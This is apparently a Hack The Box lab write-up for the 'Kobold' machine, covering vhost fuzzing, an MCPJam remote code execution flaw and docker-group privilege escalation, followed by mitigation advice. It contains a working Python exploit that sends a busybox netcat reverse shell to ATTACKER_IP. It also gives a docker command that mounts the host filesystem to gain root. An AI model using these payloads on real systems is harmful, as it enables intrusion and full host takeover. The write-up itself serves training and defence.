## Summary

Kobold is an Easy Linux machine where virtual host fuzzing reveals an
**MCPJam** instance vulnerable to remote code execution (CVE-2026-23744). The
RCE provides a shell as `ben`. The initial shell does not inherit all of the
user's groups; running with `sg docker` reveals membership in the **docker**
group, which is abused to mount the host filesystem and escalate to **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Kobold | Easy | Linux | Hack The Box |

## Attack Path

1. Service enumeration with Nmap.
2. Subdomain/vhost discovery with Gobuster.
3. An MCPJam application is identified.
4. RCE is exploited (CVE-2026-23744).
5. Initial access is obtained as `ben`.
6. Privilege escalation via the docker group.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.23.43
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Redirects to HTTPS |
| 443 | HTTPS | nginx + virtual hosts |

## Web Enumeration

The main application redirected to HTTPS, so virtual host fuzzing was performed.

```bash
gobuster vhost -u https://kobold.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -k --append-domain
```

Two subdomains were found:

- `mcp.kobold.htb` — an **MCPJam** application
- `bin.kobold.htb` — a **PrivateBin** instance (encrypted pastes, not directly exploitable)

## Exploitation — MCPJam RCE (CVE-2026-23744)

MCPJam is vulnerable to arbitrary command execution through the
`/api/mcp/connect` endpoint, which accepts an attacker-controlled server
configuration.

```python
import requests

target = "https://TARGET"
ip = "ATTACKER_IP"
port = "ATTACKER_PORT"

url = f"{target}/api/mcp/connect"
data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", ip, port, "-e", "/bin/bash"],
        "env": {},
    },
    "serverId": "213j1l3jkljkl3j",
}

response = requests.post(url, json=data, verify=False)
print(response.status_code)
print(response.text)
```

## Initial Access (User)

A listener was prepared and the exploit fired, returning a reverse shell as
`ben`.

```bash
nc -lvnp 1337
```

The user flag lives at `/home/ben/user.txt`.

## Privilege Escalation

### Enumeration

Standard checks (`sudo -l`, SUID, capabilities) revealed no direct vector. The
key insight was that the initial shell did not inherit all of the user's
groups. Forcing the docker group revealed the real membership:

```bash
sg docker -c "id"
```

```
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

### Abusing the docker group

Membership in the `docker` group is equivalent to root: a container can mount
the host filesystem and `chroot` into it.

```bash
sg docker -c "docker images"
sg docker -c "docker run --rm -v /:/mnt -it mysql chroot /mnt sh"
```

```
uid=0(root) gid=0(root)
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**MCPJam RCE (CVE-2026-23744)** — the `/api/mcp/connect` endpoint executed
commands from an attacker-controlled server configuration, giving
unauthenticated RCE. Fix: upgrade MCPJam, never execute user-supplied command
fields, and authenticate the endpoint.

**Docker group privilege escalation** — members of the `docker` group can run
containers that bind-mount the host filesystem, which is equivalent to root.
Fix: treat docker group membership as root, restrict it to trusted accounts, and
use rootless Docker or fine-grained authorization where possible.

## Tools Used

- Nmap
- Gobuster
- Netcat
- Python (requests)

## Key Takeaways

- Subdomain/vhost enumeration is essential to find the real attack surface.
- APIs can hide critical RCE behind innocuous-looking endpoints.
- Not every shell inherits full group membership; verify with `id` and `sg`.
- Membership in the docker group is effectively root.
